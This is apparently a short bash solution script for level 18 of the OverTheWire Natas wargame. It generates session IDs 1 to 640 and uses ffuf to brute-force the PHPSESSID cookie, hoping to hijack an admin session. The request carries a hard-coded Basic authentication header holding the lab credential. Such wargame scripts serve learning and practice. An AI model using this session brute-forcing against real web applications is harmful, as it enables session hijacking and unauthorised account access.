
for i in {1..640}
do
    echo $i >> num.list
done

URL="http://natas18.natas.labs.overthewire.org/index.php"
auth="Authorization: Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA=="
ffuf -ic -w ./num.list -u "$URL" -H $auth -H "Cookie: PHPSESSID=FUZZ" -fw 55
rm ./num.list